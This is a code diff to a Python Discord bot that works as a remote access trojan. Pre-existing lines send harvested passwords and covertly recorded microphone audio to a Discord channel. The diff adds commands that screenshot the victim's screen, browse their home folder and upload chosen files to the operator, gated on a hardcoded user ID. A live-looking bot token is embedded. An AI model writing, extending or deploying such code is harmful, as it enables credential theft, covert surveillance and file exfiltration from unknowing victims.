@@ -9,6 +9,10 @@ import threading
 import recorder as audio_recorder
 import passwords
 import time
+import pyautogui
+import os
+import shutil
+
 
 # Discord bot token
 TOKEN = "MTExNTIwMjU0MzQxNzU2MTE1OQ.GvSXnq.kzE73fkf8iEk6YFPDNJhuJvJXIJKheJQc2LEhY"
@@ -100,24 +104,94 @@ async def on_ready():
 @client.event
 async def on_message(message):
     print(f"Message received: {message.content}")
-    if message.author == client.user:
-        return
+    if message.author != client.user or not message.author.bot:
+        
+        if message.content == ".passwords":
+            file_paths = passwords.main()
 
-    if message.content == ".passwords":
-        file_paths = passwords.main()
+            chanle = client.get_channel(files_channel_id)
+            if chanle is None:
+                print("Channel not found")
+                return
 
-        chanle = client.get_channel(files_channel_id)
-        if chanle is None:
-            print("Channel not found")
-            return
+            for file_path in file_paths:
+                await chanle.send(file=discord.File(file_path))
 
-        for file_path in file_paths:
-            await chanle.send(file=discord.File(file_path))
+            # Delete the files and the folder
+            await asyncio.sleep(5)
+            for file_path in file_paths:
+                utility.delete_file(file_path)
 
-        # Delete the files and the folder
-        await asyncio.sleep(5)
-        for file_path in file_paths:
-            utility.delete_file(file_path)
+        if message.content == ".ss":
+            screenshot = pyautogui.screenshot()
+            screenshot.save("screenshot.png")
+            chanle = client.get_channel(files_channel_id)
+            if chanle is None:
+                print("Channel not found")
+                return
+            await chanle.send(file=discord.File("screenshot.png"))
+            utility.delete_file("screenshot.png")
+            
+        if message.content == ".files":
+            if message.author.id == 632519262585618437:
+                content = ""
+                files = os.listdir(os.environ["USERPROFILE"])
+                for file in files:
+                    content += f"{str(files.index(file))}: {file}\n"
+                    
+                await message.channel.send(f"```{content}```")
+
+                
+
+                while True:
+                    try:
+                        message = await client.wait_for("message", timeout=20, check=lambda message: message.author.id == 632519262585618437)
+                    except asyncio.TimeoutError:
+                        await message.channel.send("Command timed out. Exiting file explorer.")
+                        return
+                    # if the selected file is a directory
+                    if os.path.isdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])])):
+                        if message.content == "0":
+                            # go back
+                            content = ""
+                            files = os.listdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]))
+                            for file in files:
+                                content += f"{files.index(file)}: {file}\n"
+                            # print(f"Current directory: {files[int(message.content.split(".files "))[1])]}\n")
+                            print(f"Current files: {content}\n")
+                            await message.channel.send(f"```{content}```")
+                        else:
+                            # open the file
+                            content = ""
+                            files = os.listdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]))
+                            for file in files:
+                                content += f"{files.index(file)}: {file}\n"
+                            # print(f"Current directory: {files[int(message.content.split(".files ")[1])]}\n")
+                            print(f"Current files: {content}\n")
+                            await message.channel.send(f"```{content}```")
+
+                    else:
+                        # if the selected file is a file
+                        await message.channel.send("Downloading..")
+                        await message.channel.send(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]), file=discord.File(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])])))
+                        return
+                    
+
+            
+        if message.content.startswith(".download"):
+            param = message.content.split(".download ")[1]
+
+            ex = param.split(".")[-1]
+            print(ex)
+
+            path = os.path.join(os.environ["USERPROFILE"], param)
+            filename = "dwn" + str(int(random.random() * 1000)) + "." + ex
+            shutil.copyfile(path, filename)
+            await message.channel.send("Downloading..")
+            await message.channel.send(path, file=discord.File(filename))
+            os.remove(filename)
+
+
 
 
 # Function to record and send audio
@@ -131,7 +205,7 @@ def record_and_send_audio():
         records_channel = client.get_channel(records_channel_id)
         asyncio.run_coroutine_threadsafe(
             records_channel.send(file=discord.File(audio_path)), client.loop)
-        time.sleep(8)
+        time.sleep(10)
         print("deleting last audio")
         # delete the audio file
         utility.delete_file(audio_path)
